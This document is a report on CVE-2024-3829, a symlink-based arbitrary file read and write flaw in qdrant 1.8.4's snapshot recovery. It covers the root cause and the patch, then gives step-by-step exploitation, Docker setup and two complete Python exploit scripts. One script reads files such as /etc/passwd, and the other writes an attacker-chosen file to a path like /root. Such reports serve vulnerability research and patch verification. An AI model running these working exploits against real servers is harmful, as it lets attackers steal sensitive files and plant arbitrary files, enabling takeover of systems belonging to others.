# CVE-2024-3829 Detailed Report

## Summary
CVE-2024-3829 is a critical vulnerability identified in the `qdrant` software, specifically affecting version 1.8.4. The vulnerability is categorized under CWE-20, which denotes "Improper Input Validation." This flaw allows attackers to perform arbitrary file read and write operations during the snapshot recovery process. By manipulating snapshot files to include symbolic links (symlinks), an attacker can exploit this vulnerability to read sensitive files from the filesystem and write arbitrary files, potentially leading to a complete system takeover. The issue has been addressed in version 1.9.0 of the software.

## Root Cause of the Vulnerability
The root cause of the vulnerability lies in the handling of snapshot files during the recovery process. The code responsible for unpacking snapshot archives does not adequately validate the contents of these archives, allowing symlinks to be included. Specifically, the recovery process iterates over files in the snapshot's directory structure and extracts `.tar` files without checking for symlinks. 

The provided patch introduces a validation mechanism that ensures only regular files and directories are allowed in snapshot archives. This is achieved by implementing a function `validate_open_snapshot_archive`, which checks the entry types in the tar archive before proceeding with the extraction. The absence of this validation in the original code allowed attackers to create malicious snapshot files that could lead to arbitrary file access.

### Code Analysis
The original code snippet for restoring snapshots is as follows:
```rust
pub fn restore_snapshot(snapshot_path: &Path, segment_id: &str) -> OperationResult<()> {
    let segment_path = snapshot_path.parent().unwrap().join(segment_id);
    let archive_file = File::open(snapshot_path).map_err(|err| {
        OperationError::service_error(format!(
            "failed to open segment snapshot archive {snapshot_path:?}: {err}"
        ))
    })?;
    tar::Archive::new(archive_file)
        .unpack(&segment_path)
        .map_err(|err| {
            OperationError::service_error(format!(
                "failed to unpack segment snapshot archive {snapshot_path:?}: {err}"
            ))
        })?;
```
The patch modifies this code to include validation:
```rust
let mut archive = open_snapshot_archive_with_validation(snapshot_path)?;
archive.unpack(&segment_path).map_err(|err| {
    OperationError::service_error(format!(
        "failed to unpack segment snapshot archive {snapshot_path:?}: {err}"
    ))
})?;
```
This change ensures that symlinks are not processed, thus mitigating the vulnerability.

## Exploitation Details
To exploit this vulnerability, an attacker would need to perform the following steps:

1. **Create a Malicious Snapshot**: The attacker creates a snapshot file that includes symlinks pointing to sensitive files on the filesystem. For example, a symlink could be created in the snapshot that points to `/etc/passwd`.

2. **Upload the Malicious Snapshot**: The attacker uploads the modified snapshot to the `qdrant` server.

3. **Trigger Recovery**: The attacker initiates the recovery process for the collection associated with the malicious snapshot.

4. **Access Sensitive Data**: Upon recovery, the contents of the symlinked file (e.g., `/etc/passwd`) would be included in the new snapshot, allowing the attacker to read sensitive information.

5. **Arbitrary File Write**: The attacker can also write arbitrary files by including a symlink and a payload file in the snapshot's directory structure.

## Environment Setup Requirements
- **Port**: 6333
- **Target Endpoint**: 
  - For reading: `http://localhost:6333/collections/{collection_name}/snapshots/upload`
  - For writing: `http://localhost:6333/collections/{collection_name}/snapshots`
- **Explicit Configuration**: 
  - Docker command to run the PoC: 
    ```bash
    $ docker run -p 6333:6333 --name qdrant_poc qdrant/qdrant:dev
    ```

## Complete PoC Code
### `poc_read.py`
```python
import tarfile
from io import BytesIO
from random import randbytes
from argparse import ArgumentParser
from requests import Session
from urllib.parse import quote, unquote

if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("--url", default="http://localhost:6333")
    parser.add_argument("--path", default="/etc/passwd")
    args = parser.parse_args()

    url_base = args.url

    with Session() as s:
        # create a new collection:
        cname = "c_" + randbytes(4).hex()
        rsp = s.put(f"{url_base}/collections/{cname}", json={})
        print(f"created collection {cname}")

        # create and retrieve a snapshot:
        rsp = s.post(f"{url_base}/collections/{cname}/snapshots", json={})
        sname = rsp.json()["result"]["name"]

        rsp = s.get(f"{url_base}/collections/{cname}/snapshots/{sname}")
        snapshot = BytesIO(rsp.content)
        print(f"created snapshot {sname}")

        # cleanup:
        s.delete(f"{url_base}/collections/{cname}/snapshots/{sname}")
        s.delete(f"{url_base}/collections/{cname}")

        # add a symlink to the snapshot tar file:
        with tarfile.open(fileobj=snapshot, mode="a") as tar:
            info = tarfile.TarInfo("0/wal/sneaky")
            info.type = tarfile.SYMTYPE
            info.linkname = args.path
            tar.addfile(info)

        # recreate the collection from that modified snapshot:
        rsp = s.post(f"{url_base}/collections/{cname}/snapshots/upload", files={
            "snapshot" : ("x.snapshot", snapshot.getvalue(), "application/tar")
        })

        # create a snapshot for this new collection; contents of symlinks will be
        # copied into the archive as regular files:
        rsp = s.post(f"{url_base}/collections/{cname}/snapshots", json={})
        sname = rsp.json()["result"]["name"]

        rsp = s.get(f"{url_base}/collections/{cname}/snapshots/{sname}")
        snapshot = BytesIO(rsp.content)

        with tarfile.open(fileobj=snapshot, mode="r") as tar:
            buf = tar.extractfile("0/wal/sneaky").read()

        try:
            print(buf.decode())
        except UnicodeDecodeError:
            print(buf)

        s.delete(f"{url_base}/collections/{cname}/snapshots/x.snapshot")
        s.delete(f"{url_base}/collections/{cname}/snapshots/{sname}")
        s.delete(f"{url_base}/collections/{cname}")
```

### `poc_write.py`
```python
import tarfile
from io import BytesIO
from random import randbytes
from pathlib import Path
from argparse import ArgumentParser
from requests import Session

if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("--url", default="http://localhost:6333")
    parser.add_argument("--remote_path", default="/root/poc.txt")
    parser.add_argument("--local_path", default="payload.txt")
    args = parser.parse_args()

    cname = "c_" + randbytes(4).hex()
    remote_path = Path(args.remote_path)

    with Session() as s:
        # create a new collection:
        rsp = s.put(f"{args.url}/collections/{cname}", json={})

        # create and retrieve a snapshot:
        rsp = s.post(f"{args.url}/collections/{cname}/snapshots", json={})
        sname = rsp.json()["result"]["name"]

        rsp = s.get(f"{args.url}/collections/{cname}/snapshots/{sname}")
        snapshot = BytesIO(rsp.content)

        # create a fake tar with payload:
        fake_tar = BytesIO()
        with tarfile.open(fileobj=fake_tar, mode="w") as tar:
            tar.add(args.local_path, arcname=str(remote_path.name))

        # modify the snapshot to add a new segment .tar with a payload and a pre-existing
        # directory symlink with the same name (sans .tar);
        with tarfile.open(fileobj=snapshot, mode="a") as tar:
            info = tarfile.TarInfo(f"0/segments/redirect.tar")
            info.size = len(fake_tar.getvalue())
            tar.addfile(info, fileobj=BytesIO(fake_tar.getvalue()))

            info = tarfile.TarInfo(f"0/segments/redirect")
            info.type = tarfile.SYMTYPE
            info.linkname = str(remote_path.parent)
            tar.addfile(info)

        rsp = s.post(f"{args.url}/collections/{cname}/snapshots/upload", files={
            "snapshot" : ("x.snapshot", snapshot.getvalue(), "application/tar")
        })

        rsp = s.delete(f"{args.url}/collections/{cname}/snapshots/{sname}")
        rsp = s.delete(f"{args.url}/collections/{cname}")
        rsp = s.delete(f"{args.url}/collections/{cname}/snapshots/x.snapshot")
```

This report provides a comprehensive overview of CVE-2024-3829, detailing the vulnerability, its root cause, exploitation methods, and the necessary environment setup to reproduce the issue.